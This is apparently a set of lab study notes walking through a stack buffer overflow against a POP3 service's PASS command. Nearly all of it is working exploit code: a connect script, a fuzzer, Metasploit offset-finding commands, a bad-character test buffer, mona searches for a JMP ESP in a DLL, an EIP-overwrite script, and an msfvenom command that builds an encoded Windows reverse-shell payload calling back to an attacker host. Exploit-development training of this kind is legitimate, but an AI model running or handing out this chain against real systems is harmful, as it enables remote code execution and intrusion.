# bofwalkthrough
CONNECT
#!/usr/bin/python

import socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
try:
         print "\nSending evil buffer..."
         s.connect(('10.0.0.22',110))            # connect to IP, POP3 port
         data = s.recv(1024)                     # receive banner
         print data                              # print banner   
 
         s.send('USER test' +'\r\n')             # send username "test"
         data = s.recv(1024)                     # receive reply
         print data                              # print reply 
 
         s.send('PASS test\r\n')                 # send password "test"
         data = s.recv(1024)                     # receive reply
         print data                              # print reply 
 
         s.close()                               # close socket
         print "\nDone!"
except:
    print "Could not connect to POP3!"

FUZZ


#!/usr/bin/python
import socket

#Create an array of buffers, from 1 to 5900 with increments of 200.
buffer = ["A"]
counter = 100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing PASS with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('10.11.14.144',110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()

Find EIP
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q  

Badchars

#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ) 

buffer ="A"*2606 + "B"*4 + badchars

try:
    print "\nSending evil buffer..."
    s.connect(('10.11.14.144',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!"

!mona modules

jmp esp

push esp
retn

ruby /usr/share/metasploit-framework/tools/nasm_shell.rb
add eax,12
jmp eax

!mona find -s "\xff\xe4" -m slmfc.dll (mona find jmp esp in .dll file)


#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf = "A" * 2606 + "\x5f\x4a\x35\x8f" + "C" *(3500 - 2606 - 4)

try:
    print "\nSending evil buffer..."
    s.connect(('10.11.14.144',110))
    data = s.recv(1024)
    print data

    s.send('USER test' +'\r\n')
    data = s.recv(1024)
    print data

    s.send('PASS ' + buf + '\r\n')
    data = s.recv(1024)
    print data

    s.close()
    print "\nDone!"

except:
    print "Could not connect to POP3!"

 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
